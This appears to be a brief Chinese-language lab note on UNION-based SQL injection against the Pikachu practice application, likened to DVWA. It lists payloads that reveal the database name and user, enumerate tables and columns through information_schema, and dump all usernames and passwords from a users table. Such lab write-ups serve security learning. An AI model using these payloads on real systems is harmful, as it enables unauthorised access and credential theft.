和dvwa一样的步骤，这里不知道会不会有排序规则的问题

union select database(),user() -- 回显了我们的身份，一个叫pikachu的库名，以及我们的email

然后去拿库里的东西，UNION SELECT CAST(table_name AS CHAR), 2 FROM information_schema.tables WHERE table_schema = 'pikachu' --

去找表名

union select group_concat(column_name),2 from information_schema.columns where table_schema='pikachu' and table_name='users'

之后查密码即可

union select group_concat(username),group_concat(password) from users
